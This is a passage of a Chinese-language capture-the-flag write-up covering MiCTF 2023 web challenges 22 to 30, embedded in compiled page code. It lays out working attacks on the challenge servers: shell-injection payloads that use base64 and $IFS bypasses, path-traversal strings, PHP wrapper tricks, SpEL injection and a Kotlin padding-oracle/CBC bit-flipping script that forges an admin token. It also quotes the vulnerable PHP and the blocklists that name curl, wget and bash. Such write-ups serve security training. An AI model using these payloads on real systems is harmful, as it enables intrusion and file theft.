Y2F0IC9ldGMvZ2V0ZmxhZy5waHA=))\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u53EF\u4EE5\u770B\u4E00\u4E0B\u88AB\u56F0\u6270\u4E86\u597D\u4E45\u7684\u5E90\u5C71\u771F\u9762\u76EE\uFF1A"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"GET /?ip=%24(%24(base64%20-d%20%3c%3c%3c%20Y2F0IGluZGV4LnBocA%3d%3d)) HTTP/2\nHost: vul-php1-ctf.dun.mi.com\n\nHTTP/2 200 OK\nDate: Thu, 11 May 2023 12:16:22 GMT\nContent-Type: text/html; charset=UTF-8\nServer: MonKing/3.14\nXiaomi-Security-Center: if any vulnerability found, go https://sec.xiaomi.com\nX-Proxy-Node: 6DFF018CAF79FBEC\n\nping: IDN encoding of ''<?php<br />\n#flag\u5728/etc/getflag.php<br />\nif (isset($_GET['ip'])) {<br />\n    $ip = $_GET['ip'];<br />\n    $in_ip = escape_shell_arg($ip);<br />\n    $ping_result = run_with_timeout(\"ping -c 2 \\\"$in_ip\\\"\", 4);<br />\n    echo nl2br($ping_result);<br />\n} else {<br />\n    echo \"\u8BF7\u4F20\u9012 ip \u53C2\u6570\uFF01\";<br />\n}<br />\n<br />\nfunction escape_shell_arg($arg) {<br />\n    // \u5BF9\u5B57\u7B26\u4E32\u4E2D\u7684\u5355\u5F15\u53F7\u3001\u53CC\u5F15\u53F7\u3001&\u3001|\u3001;\u3001`\u7B49\u5B57\u7B26\u8FDB\u884C\u8FC7\u6EE4<br />\n    if (preg_match(\"/['\\\"&|;`]/\", $arg)) {<br />\n        http_response_code(403);<br />\n        exit;<br />\n    }<br />\n<br />\n    return escapeshellarg($arg);<br />\n}<br />\n<br />\nfunction run_with_timeout($cmd, $timeout) {<br />\n    $output = null;<br />\n    $pipes = null;<br />\n<br />\n    // \u521B\u5EFA\u4E00\u4E2A\u5B50\u8FDB\u7A0B\u5E76\u6267\u884C\u547D\u4EE4<br />\n    $process = proc_open($cmd, [['pipe', 'r'], ['pipe', 'w'], ['pipe', 'w']], $pipes);<br />\n    <br />\n    if (is_resource($process)) {<br />\n        stream_set_blocking($pipes[1], 0); // \u975E\u963B\u585E\u8BFB\u53D6\u6807\u51C6\u8F93\u51FA<br />\n        stream_set_blocking($pipes[2], 0); // \u975E\u963B\u585E\u8BFB\u53D6\u6807\u51C6\u9519\u8BEF<br />\n        $start_time = time();<br />\n<br />\n        while (true) {<br />\n            // \u68C0\u67E5\u5B50\u8FDB\u7A0B\u662F\u5426\u5DF2\u7ECF\u7ED3\u675F<br />\n            $status = proc_get_status($process);<br />\n            if (!$status['running']) {<br />\n                break;<br />\n            }<br />\n<br />\n            // \u8BFB\u53D6\u6807\u51C6\u8F93\u51FA\u548C\u6807\u51C6\u9519\u8BEF<br />\n            $stdout = stream_get_contents($pipes[1]);<br />\n            $stderr = stream_get_contents($pipes[2]);<br />\n<br />\n            // \u5982\u679C\u8D85\u65F6\u5219\u6740\u6B7B\u5B50\u8FDB\u7A0B\u5E76\u9000\u51FA<br />\n            if (time() - $start_time >= $timeout) {<br />\n                proc_terminate($process);<br />\n                return \"Command execution timed out!\";<br />\n            }<br />\n<br />\n            // \u6682\u505C\u4E00\u6BB5\u65F6\u95F4\u518D\u7EE7\u7EED\u8BFB\u53D6<br />\n            usleep(10000);<br />\n        }<br />\n<br />\n        // \u8BFB\u53D6\u5B50\u8FDB\u7A0B\u9000\u51FA\u65F6\u7684\u6807\u51C6\u8F93\u51FA\u548C\u6807\u51C6\u9519\u8BEF<br />\n        $output = stream_get_contents($pipes[1]);<br />\n        $output .= stream_get_contents($pipes[2]);<br />\n        fclose($pipes[0]);<br />\n        fclose($pipes[1]);<br />\n        fclose($pipes[2]);<br />\n        proc_close($process);<br />\n    }<br />\n<br />\n    return $output;<br />\n}<br />\n<br />\n?>'' failed with error code 9<br />\n"})}),"\n",(0,i.jsxs)(n.h3,{id:"web-22-\u6587\u4EF6\u9884\u89C8\u670D\u52A1\u5668",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-22-\u6587\u4EF6\u9884\u89C8\u670D\u52A1\u5668",children:"#"}),"web-22 \u6587\u4EF6\u9884\u89C8\u670D\u52A1\u5668"]}),"\n",(0,i.jsx)(n.p,{children:"\u8BBF\u95EE\u5730\u5740\uFF0C\u63D0\u793A\u63D0\u4F9Bfilepath\uFF0C\u968F\u4FBF\u8BD5\u4E86\u51E0\u4E2A\uFF0C\u53EA\u662F\u8FD4\u56DE\u201C\u6587\u4EF6\u4E0D\u5B58\u5728\u201D\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u8BD5\u4E86\u4E0Bindex.php\uFF0C\u53D1\u73B0\u8FD4\u56DE\u4E86\u6E90\u7801\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u6587\u4EF6\u6E90\u7801",src:ed})}),"\n",(0,i.jsx)(n.p,{children:"\u6E90\u7801\u544A\u8BC9\u4E86flag\u7684\u4F4D\u7F6E\u548C\u57FA\u672C\u7684\u4EE3\u7801\u903B\u8F91\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u770B\u6CE8\u91CA\uFF0C\u8BF4\u662F\u4E0D\u80FD\u5305\u542B\u4E24\u4E2A\u8FDE\u7EED\u7684\u4E0A\u4E00\u7EA7\uFF0C\u90A3\u5C31\u7528\u5F53\u524D\u76EE\u5F55\u9694\u5F00\u5C31\u884C\u4E86\u3002\u6784\u9020filepath\u83B7\u53D6flag\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"filepath=.././.././../etc/flag.php\n"})}),"\n",(0,i.jsxs)(n.h3,{id:"web-23-php-is-best",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-23-php-is-best",children:"#"}),"web-23 PHP IS BEST"]}),"\n",(0,i.jsx)(n.p,{children:"php\u6E90\u7801\u5BA1\u8BA1\u9898"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",meta:"",children:'<?php\ninclude \'flag.php\';\nextract($_GET);\nif (!empty($one))\n{\n    $three = trim(file_get_contents($two));\n    if ($one === $three)\n    {\n        echo "<p>\u606D\u559C:" ." $flag</p>";\n    }\n    else\n    {\n        echo "<p>\u7EE7\u7EED\u52A0\u6CB9\uFF01</p>";\n    }\n}\nelse\n{\n    highlight_file(__FILE__);\n}\n?>\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u4ECEget\u53C2\u6570\u7684two\u4F20\u9012\u4E00\u4E2A\u8DEF\u5F84\uFF0C\u83B7\u53D6\u8FD9\u4E2A\u8DEF\u5F84\u7684\u503C\uFF0C\u5E76\u4E14\u4E0Eone\u4E2D\u7684\u503C\u6BD4\u8F83\uFF0C\u5982\u679C\u76F8\u7B49\u5219\u8F93\u51FAflag\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u4E2A\u9898\u76EE\u7684\u5173\u952E\u662F\u5982\u4F55\u5C06two\u7684\u503C\u53D8\u4E3A\u6211\u4EEC\u53EF\u63A7\u7684\u4E00\u4E2A\u503C\uFF0C\u6B63\u597Dfile_get_contents\u652F\u6301\u83B7\u53D6base64\u7F16\u7801\u7684data\u503C\uFF0C\u7531\u6B64\u6784\u9020\u4E00\u4E2A\u8BF7\u6C42\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"http://10.167.15.103/?one=mictf&two=data%3a%2f%2ftext%2fplain%3bbase64%2cbWljdGY%3d\n"})}),"\n",(0,i.jsxs)(n.h3,{id:"web-24-\u7B80\u7EA6\u4F46\u4E0D\u7B80\u5355",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-24-\u7B80\u7EA6\u4F46\u4E0D\u7B80\u5355",children:"#"}),"web-24 \u7B80\u7EA6\u4F46\u4E0D\u7B80\u5355"]}),"\n",(0,i.jsx)(n.p,{children:"ping\u547D\u4EE4\u7ED5\u8FC7\uFF0C\u627E\u5230\u4E86\u4E00\u4E2A\u539F\u9898\u3002"}),"\n",(0,i.jsxs)(n.p,{children:["\u9996\u5148\u83B7\u53D6index.php\u4EE3\u7801\uFF0C\u7ED5\u8FC7\u7A7A\u683C\u3002 ",(0,i.jsx)(n.code,{children:"?ip=1;cat$IFS$1index.php"})]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",meta:"",children:'<?php\nif(isset($_GET[\'ip\'])){\n  $ip = $_GET[\'ip\'];\n  if(preg_match("/\\&|\\/|\\?|\\*|\\<|[\\x{00}-\\x{20}]|\\>|\\\'|\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/", $ip, $match)){\n    echo preg_match("/\\&|\\/|\\?|\\*|\\<|[\\x{00}-\\x{20}]|\\>|\\\'|\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/", $ip, $match);\n    die("fxck your symbol!");\n  } else if(preg_match("/ /", $ip)){\n    die("fxck your space!");\n  } else if(preg_match("/bash/", $ip)){\n    die("fxck your bash!");\n  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){\n    die("fxck your flag!");\n  }\n  // $a = shell_exec("ping -c 4 ".$ip);\n  $a = shell_exec("ping ".$ip);\n  echo "\n\n";\n  print_r($a);\n}\n\n?>\n'})}),"\n",(0,i.jsxs)(n.p,{children:["\u770B\u5230\u4EE3\u7801\u786E\u5B9A\u662F\u539F\u9898\u4E86\u3002\u7528\u62FC\u63A5\u7684\u65B9\u6CD5\uFF0C\u7ED5\u8FC7\u5BF9flag\u987A\u5E8F\u7684\u68C0\u6D4B ",(0,i.jsx)(n.code,{children:"?ip=1%3ba%3dag.php%3bb%3dfl%3bcat%24IFS%241%24b%24a"})]}),"\n",(0,i.jsxs)(n.h3,{id:"web-25-\u795E\u5947\u7684\u8BA1\u7B97\u5668",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-25-\u795E\u5947\u7684\u8BA1\u7B97\u5668",children:"#"}),"web-25 \u795E\u5947\u7684\u8BA1\u7B97\u5668"]}),"\n",(0,i.jsxs)(n.p,{children:["\u968F\u4FBF\u8F93\u5165\u4E00\u4E2A\u8868\u8FBE\u5F0F\uFF0C\u4F1A\u81EA\u52A8\u5305\u88F9",(0,i.jsx)(n.code,{children:"#{}"}),"\u7136\u540E\u8FD4\u56DE\u8868\u8FBE\u5F0F\u7ED3\u679C\uFF0C\u731C\u6D4B\u662FspEL\u7684\u8868\u8FBE\u5F0F\u5F15\u64CE\u3002spEL\u8868\u8FBE\u5F0F\u53EF\u4EE5\u901A\u8FC7T()\u83B7\u53D6\u7C7B\uFF0C\u7136\u540E\u5229\u7528\u5185\u90E8\u7684\u7C7B\u6267\u884C\u4E00\u4E9B\u547D\u4EE4\u3002"]}),"\n",(0,i.jsx)(n.p,{children:"\u601D\u8DEF\u662F\u8FD9\u6837\uFF0C\u5B9E\u9645\u64CD\u4F5C\u8FC7\u7A0B\u4E2D\uFF0C\u53D1\u73B0\u8FC7\u6EE4\u4E86\u5F88\u591A\u5173\u952E\u8BCD"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"getClass\nexec\nlang\nforName\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u5C31\u5BFC\u81F4getClass()\u7136\u540EforName()\u83B7\u53D6\u5BF9\u5E94\u7C7B\u7684\u65B9\u6CD5\u65E0\u6CD5\u4F7F\u7528\u4E86\u3002"}),"\n",(0,i.jsxs)(n.p,{children:["\u8BD5\u4E86\u597D\u51E0\u4E2A\u65B9\u6CD5\uFF0C\u7EC8\u4E8E\u53D1\u73B0\u4E00\u4E2A\u8BFB\u6587\u4EF6\u7684\u65B9\u5F0F\u6CA1\u6709\u88AB\u8FC7\u6EE4\uFF0C\u6839\u636E\u524D\u51E0\u4E2AJava\u9898\u731C\u6D4B\uFF08\u53EF\u80FD\u662F\u4E00\u4E2A\u4EBA\u51FA\u7684\u9898\u76EE\uFF09flag\u7684\u6587\u4EF6\u540D\u662F",(0,i.jsx)(n.code,{children:"flag.txt"}),"\u3002\u5199\u5165\u811A\u672C\u6210\u529F\u83B7\u53D6flag\u3002"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:'expression=#{new java.util.Scanner(new java.io.File("flag.txt")).next()}\n'})}),"\n",(0,i.jsxs)(n.h3,{id:"web-26-\u5929\u5973\u6563\u82B1",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-26-\u5929\u5973\u6563\u82B1",children:"#"}),"web-26 \u5929\u5973\u6563\u82B1"]}),"\n",(0,i.jsx)(n.p,{children:"\u4E0A\u6765\u7ED9\u4E86\u4E00\u4E2A\u9875\u9762\uFF0C\u8BD5\u4E86\u4E00\u4E0B\uFF0C\u53D1\u73B0\u8DF3\u8F6C\u5230error.html\uFF0C\u5F00\u59CB\u731C\u6D4B\u9875\u9762\u5730\u5740\u3002\u6700\u540E\u731C\u5230\u4E86success.html\u6709\u5185\u5BB9\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u5165\u53E3\u9875\u9762",src:eo})}),"\n",(0,i.jsx)(n.p,{children:"\u63D0\u4F9B\u4E86\u56DB\u4E2A\u9875\u9762\uFF0C\u524D\u4E09\u4E2A\u6BCF\u4E2A\u9875\u9762\u7684\u6E90\u7801\u90FD\u80FD\u770B\u5230\u4E00\u6BB5flag\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u9875\u97621",src:ep})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u9875\u97622",src:eh})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u9875\u97623",src:ex})}),"\n",(0,i.jsx)(n.p,{children:"\u6700\u540E\u4E00\u4E2A\u9875\u9762\u901A\u8FC7\u94FE\u63A5\u8DF3\u8F6C\u4E0D\u8FC7\u53BB\uFF0C\u770B\u9875\u9762\u5206\u5E03\u60C5\u51B5\uFF0C\u731C\u6D4B\u6700\u540E\u4E00\u4E2A\u9875\u9762\u5730\u5740\u662F04.html"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u9690\u85CF\u7684\u9875\u97624",src:em})}),"\n",(0,i.jsx)(n.p,{children:"\u62FC\u51D1\u51FA\u6765\u63D0\u4EA4flag\u3002"}),"\n",(0,i.jsxs)(n.h3,{id:"web-27-\u60F3\u83B7\u53D6flag\u5417",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-27-\u60F3\u83B7\u53D6flag\u5417",children:"#"}),"web-27 \u60F3\u83B7\u53D6flag\u5417"]}),"\n",(0,i.jsx)(n.p,{children:"\u63D0\u793A\u7ED9\u51FA\u6765\u8BF4\u8981\u5148\u83B7\u53D6\u6E90\u7801\uFF0C\u67E5\u770B\u63D0\u793A\u53EF\u4EE5\u5C1D\u8BD5\u5305\u542Bma.php\u3002\u5728index.php\u8BD5\u4E86\u51E0\u4E2A\u53C2\u6570\uFF0C\u53D1\u73B0file=\u53EF\u4EE5\u5305\u542B\u3002\u83B7\u53D6index.php\u548Cma.php\u7684\u6E90\u7801\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"/?file=php://filter/convert.base64-encode/resource=ma.php\n/?file=php://filter/convert.base64-encode/resource=index.php\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u91CC\u91CD\u70B9\u770B\u4E00\u4E0Bma.php\u7684\u6E90\u7801\uFF0C\u662F\u4E00\u4E2A\u7ED5\u8FC7"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",meta:"",children:'<?php\nerror_reporting(0);\nfunction blacklist($cmd){\n  $filter = "(\\\\<|\\\\>|php|curl| |0x|\\\\\\\\|python|gcc|less|root|etc|pass|http|ftp|cd|tcp|udp|cat|\xd7|flag|ph|hp|wget|type|ty|\\\\$\\\\{IFS\\\\}|index|\\\\*)";\n  if (preg_match("/".$filter."/is",$cmd)==1){  \n      exit(\'Go out! This black page does not belong to you!\');\n  }\n  else{\n    system($cmd);\n  }\n}\nblacklist($_GET[\'cmd\']);\n?>\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u770B\u6837\u5B50\u7981\u7528\u4E86\u7A7A\u683C\uFF0C\u4E00\u4E9B\u57FA\u672C\u7684\u67E5\u770B\u547D\u4EE4\uFF0C\u5C1D\u8BD5\u4E86\u51E0\u79CD\u65B9\u6CD5\uFF0C\u6700\u540E\u7528base64\u7F16\u7801+\u7A7A\u683C\u7ED5\u8FC7\u7684\u65B9\u5F0F\u83B7\u53D6\u5230\u7684flag\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"/ma.php/?cmd=echo$IFS$9Y2F0IC9mbGFnLnR4dA==|base64$IFS$9-d|bash\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u7A7A\u683C\u4F7F\u7528 ",(0,i.jsx)(n.code,{children:"$IFS$9"})," \u7ED5\u8FC7\uFF0C\u547D\u4EE4\u7F16\u7801base64\uFF0C\u5185\u5BB9\u662F ",(0,i.jsx)(n.code,{children:"cat /flag.txt"}),"\u3002"]}),"\n",(0,i.jsxs)(n.h3,{id:"web-28-\u795E\u5947\u7684\u9B54\u65B9",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-28-\u795E\u5947\u7684\u9B54\u65B9",children:"#"}),"web-28 \u795E\u5947\u7684\u9B54\u65B9"]}),"\n",(0,i.jsx)(n.p,{children:"\u5F00\u59CB\u7ED9\u4E86\u4E2A\u9875\u9762\uFF0C\u662F\u4E2A\u9B54\u65B9\u6E38\u620F\u3002\u5F00\u59CB\u627E\u9875\u9762\u6E90\u7801\u7684\u5185\u5BB9\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u6E90\u7801",src:eg})}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u6BB5\u5947\u602A\u7684\u6DF7\u6DC6\u6700\u7EC8\u8BC1\u660E\u786E\u5B9E\u662F\u63A7\u5236\u53F0\u8F93\u51FA\u7684\u90A3\u4E9B\u6587\u672C\u3002\u3002\u3002"}),"\n",(0,i.jsxs)(n.p,{children:["\u7136\u540E\u770B\u5230\u4E86\u8BF7\u6C42\u5934\u91CC\u8FD4\u56DE\u7684\u670D\u52A1\u5668\u540D\u79F0",(0,i.jsx)(n.code,{children:"openresty/1.21.4.1"}),"\u6709\u4EC0\u4E48\u6F0F\u6D1E\u53EF\u4EE5\u7528\uFF0C\u627E\u4E86\u4E00\u4E0B\u4E5F\u6CA1\u6709\u3002\u3002\u3002"]}),"\n",(0,i.jsx)(n.p,{children:"\u6CE8\u610F\u5230\u7F51\u7AD9\u4F1A\u628A\u4E0D\u5B58\u5728\u7684\u8D44\u6E90\u8FD4\u56DEindex.gk\u7684\u5185\u5BB9\uFF0C\u8BD5\u4E86\u4E00\u4E2Astatic\u548Cuploads\u91CC\u5E38\u7528\u7684\u8DEF\u5F84\uFF08\u4F8B\u5982/static/index.css\uFF09\uFF0C\u53D1\u73B0\u4E0D\u592A\u884C\u3002\uFF08\u4E8B\u540E\u53D1\u73B0\uFF0C\u76F4\u63A5\u8BBF\u95EE/uploads\u8DEF\u5F84\u5C31\u51FA\u6765\u4E86\uFF09\u3002\u3002\u3002\u8003\u8651\u5230\u4E00\u4E2A\u4E00\u4E2A\u731C\u6BD4\u8F83\u9EBB\u70E6\uFF0C\u5C31\u4E0A\u8DEF\u5F84\u626B\u63CF\u4E86\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"# sumy @ SumyDeMBP in ~/PycharmProjects/dirmap on git:master\n$ python3 dirmap.py -i http://10.167.181.96/ -lcf\n\n                     #####  # #####  #    #   ##   #####\n                     #    # # #    # ##  ##  #  #  #    #\n                     #    # # #    # # ## # #    # #    #\n                     #    # # #####  #    # ###### #####\n                     #    # # #   #  #    # #    # #\n                     #####  # #    # #    # #    # #   v1.0\n\n[*] Initialize targets...\n[+] Load targets from: http://10.167.181.96/\n[+] Set the number of thread: 30\n[+] Coroutine mode\n[+] Current target: http://10.167.181.96/\n[*] Launching auto check 404\n[+] Checking with: http://10.167.181.96/avrescwitssamcofbyccnslxyowtryrdinlrmdyuaq\n[*] Use recursive scan: No\n[*] Use dict mode\n[+] Load dict:/Users/sumy/PycharmProjects/dirmap/data/dict_mode_dict.txt\n[*] Use crawl mode\n[200][application/octet-stream][6.00kb] http://10.167.181.96/.DS_Store\n[200][application/octet-stream][0b] http://10.167.181.96/common\n[200][application/json; charset=utf-8][43.00b] http://10.167.181.96/download\n[200][text/html][1.07kb] http://10.167.181.96/index.html\n[200][text/html][2.17kb] http://10.167.181.96/templates/\n[200][text/html][334.00b] http://10.167.181.96/uploads/\n100% (5715 of 5715) |##############################################| Elapsed Time: 0:02:44 Time:  0:02:44\n(base)\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u53D1\u73B0\u6709\u4E2A\u4E0B\u8F7D\u8DEF\u5F84/download\u6307\u5B9Afile\u53EF\u4EE5\u4E0B\u8F7D\u6587\u4EF6\u3002\u5C1D\u8BD5\u4E0B\u8F7D/download?file=/flag/flag.txt\uFF0C\u611F\u89C9\u6CA1\u90A3\u4E48\u5BB9\u6613\u3002\u4F1A\u5220\u9664",(0,i.jsx)(n.code,{children:"ag/"}),"\u548C",(0,i.jsx)(n.code,{children:"../"}),"\u8FD9\u4E24\u4E2A\u5B57\u7B26\u4E32\u3002"]}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u597D\u8BF4\uFF0C\u6784\u9020\u4E00\u4E0B\u5C31\u884C\u4E86\uFF1A"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"..././"})," \u4EE3\u66FF ",(0,i.jsx)(n.code,{children:"../"})]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"agag//"})," \u4EE3\u66FF ",(0,i.jsx)(n.code,{children:"ag/"})]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"\u6700\u7EC8\u83B7\u53D6flag\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u8BF7\u6C42\u7ED3\u679C",src:eu})}),"\n",(0,i.jsxs)(n.h3,{id:"web-29-\u62FF\u5230\u7BA1\u7406\u5458\u6743\u9650\u5C31\u80FD\u5F97\u5230flag\u5566",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-29-\u62FF\u5230\u7BA1\u7406\u5458\u6743\u9650\u5C31\u80FD\u5F97\u5230flag\u5566",children:"#"}),"web-29 \u62FF\u5230\u7BA1\u7406\u5458\u6743\u9650\u5C31\u80FD\u5F97\u5230flag\u5566\uFF01"]}),"\n",(0,i.jsxs)(n.p,{children:["\u4E0A\u6765\u5C31\u80FD\u770B\u5230\u6E90\u7801\uFF0C\u662F\u4E00\u4E2A\u4EE3\u7801\u5BA1\u8BA1\u9898\u76EE\u3002\u76F4\u63A5\u62FF\u4EE3\u7801\u7684\u5173\u952E\u8BCD\u8C37\u6B4C\uFF0C\u53D1\u73B0\u662FCBC\u7FFB\u8F6C\u5B57\u8282\u653B\u51FB\u7684\u65B9\u6CD5\u3002\u627E\u5230\u4E00\u7BC7\u535A\u5BA2\u91CC\u9762\u6709POC\u3002",(0,i.jsx)(n.a,{href:"https://chybeta.github.io/2017/11/18/LCTF-2017-Simple-blog-writeup/",target:"_blank",rel:"noopener noreferrer",children:"https://chybeta.github.io/2017/11/18/LCTF-2017-Simple-blog-writeup/"})]}),"\n",(0,i.jsx)(n.p,{children:"\u53C2\u8003\u91CC\u9762\u7684\u4EE3\u7801\uFF0C\u5B9E\u73B0\u4E86\u4E00\u7248Java\u7248\u672C\u7684\uFF0C\u5F00\u59CB\u7206\u7834\uFF0C\u51E0\u5206\u949F\u6551\u51FA\u6765\u4E86\u3002\u3002\u3002\uFF08\u8C03\u4EE3\u7801\u8C03\u4E86\u51E0\u4E2A\u5C0F\u65F6\u3002\u3002\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-kotlin",meta:"",children:'package com.sumygg.mictf2023.web_29\n\nimport okhttp3.MediaType.Companion.toMediaType\nimport okhttp3.OkHttpClient\nimport okhttp3.Request\nimport okhttp3.RequestBody.Companion.toRequestBody\nimport org.apache.commons.codec.binary.Base64\n\n\nval url = "https://decrypt-ctfd.dun.mi.com/index.php?run=1"\nval N = 16\nvar client = OkHttpClient()\nval casCookie = "MIDUN_COOKIE"\n\nfun injectToken(token: String): String {\n    val body = "{}".toRequestBody("application/json".toMediaType())\n    val request = Request.Builder()\n        .url(url)\n        .header("Cookie", "${casCookie}PHPSESSID=$phpsession;token=$token")\n        .post(body)\n        .build()\n    val response = client.newCall(request).execute()\n    val str = response.body?.string() ?: "Err!empty body"\n//    println(str)\n    return str\n}\n\nfun xor(a: String, b: String): String {\n    return a.indices.map { (a[it].code xor b[it % b.length].code).toChar() }.joinToString("")\n}\n\nfun pad(str: String, n: Int): String {\n    val l = str.length\n    if (l != n) {\n        return str + ((n - l).toChar().toString().repeat(n - l))\n\n    }\n    return str\n}\n\nfun paddingOracle(n: Int): String {\n    var get = ""\n    for (i in 1 until n + 1) {\n        for (j in 0 until 256) {\n            val padding = xor(get, i.toChar().toString().repeat(i - 1))\n            val c = Char(0).toString().repeat(16 - i) + j.toChar() + padding\n            val result = injectToken(String(Base64.encodeBase64(c.toByteArray())))\n            if ("Err!" !in result) {\n                get = (j xor i).toChar() + get\n                break\n            }\n        }\n    }\n    return get\n}\n\nvar phpsession = "399476c1af05f00d22d4e318db0ef2a7"\nvar originToken = "eXlQSmJmdXc2NzI0SmpodQ=="\nvar token = String(Base64.decodeBase64(originToken))\n\nfun getSessionAndToken() {\n    val body = "{}".toRequestBody("application/json".toMediaType())\n    val request = Request.Builder()\n        .url(url)\n        .header("Cookie", "${casCookie}foo=bar")\n        .post(body)\n        .build()\n    val response = client.newCall(request).execute()\n    val responseCookie = response.headers("Set-Cookie")\n    val cookies = HashMap<String, String>()\n    for (setCookie in responseCookie) {\n        println(setCookie)\n        val match = "([^=]+)=([^\\\\;]+);?.*".toPattern().matcher(setCookie)\n        if (match.matches()) {\n            cookies[match.group(1)] = match.group(2)\n        }\n    }\n    phpsession = "${cookies["PHPSESSID"]}"\n    originToken = "${cookies["token"]}".replace("%3D", "=")\n    token = String(Base64.decodeBase64(originToken))\n}\n\nfun main() {\n    while (true) {\n//        getSessionAndToken()\n        println(phpsession)\n        println(originToken)\n        val middle1 = paddingOracle(N)\n        println(middle1)\n        println(middle1.length)\n        if (middle1.length + 1 == 16) {\n            for (i in 0 until 256) {\n                val middle = i.toChar() + middle1\n                println("token:${token}")\n                println("middle:${middle}")\n                val plaintext = xor(middle, token)\n                println("plaintext:${plaintext}")\n                val des = pad("admin", N)\n                var tmp = ""\n                for (j in 0 until 16) {\n                    tmp += (token[j].code xor plaintext[j].code xor des[j].code).toChar()\n                }\n                val encodeTmp = String(Base64.encodeBase64(tmp.toByteArray()))\n                println("tmp:${encodeTmp}")\n                val result = injectToken(encodeTmp)\n                println(result)\n                println()\n            }\n        }\n    }\n}\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"result",src:ef})}),"\n",(0,i.jsxs)(n.h3,{id:"web-30-\u9B54\u6CD5\u518D\u73B0",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-30-\u9B54\u6CD5\u518D\u73B0",children:"#"}),"web-30 \u9B54\u6CD5\u518D\u73B0"]}),"\n",(0,i.jsx)(n.p,{children:"\u53BB\u5E74\u6709\u4E24\u4E2A\u8FD9\u6837\u7684\u9898\u76EE\uFF0C\u4ECA\u5E74\u53C8\u6765\u4E86\u4E00\u4E2A\u3002\u731C\u6D4B\u662FImageMagick\u76F8\u5173\u7684\u6F0F\u6D1E\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u5148\u770B\u73B0\u8C61\uFF0C\u4E0A\u4F20\u4E00\u4E2A\u56FE\u7247\u6587\u4EF6\uFF08\u9650\u5B9A\u4E86\u51E0\u79CD\u683C\u5F0F\uFF09\uFF0C\u4F1A\u8F6C\u6210png\u6587\u4EF6\uFF0C\u7136\u540E\u56FE\u7247\u5BBD\u9AD8\u88AB\u8C03\u6574\u523050x50\u3002\u9875\u9762\u4E2D\u4E5F\u51FA\u73B0\u4E86flag{******}\u5B57\u6837\uFF0C\u76EE\u6807\u660E\u786E\u4E86\uFF0C\u5C31\u662F\u60F3\u529E\u6CD5\u8BFB\u53D6index.php\u6587\u4EF6\u91CC\u7684flag\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u7136\u540E\u5F00\u59CB\u627Eimagemagick\u7684\u76F8\u5173\u6F0F\u6D1E"}),"\n",(0,i.jsx)(n.p,{children:"================\u627E\u4E86\u597D\u51E0\u5929\u7684\u5206\u5272\u7EBF================="}),"\n",(0,i.jsx)(n.p,{children:"\u5076\u7136\u95F4\u53D1\u73B0\u4E862022\u5E74\u65B0\u7684\u6F0F\u6D1ECVE-2022-44268